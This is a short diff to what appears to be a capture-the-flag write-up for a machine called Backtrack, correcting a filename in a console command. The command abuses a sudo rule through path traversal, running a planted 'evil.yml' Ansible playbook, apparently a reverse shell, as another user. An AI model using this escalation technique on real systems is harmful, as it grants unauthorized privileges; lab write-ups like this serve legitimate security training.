@@ -197,7 +197,7 @@ Looking for ansible reverse shells, I found this.
 
 Let's save it to `/tmp/evil.yml` and run it with ansible.
 ```console
-tomcat@Backtrack:~$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/suspicious_ports.yml 
+tomcat@Backtrack:~$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/evil.yml 
 [WARNING]: provided hosts list is empty, only localhost is available. Note that
 the implicit localhost does not match 'all'
 ....
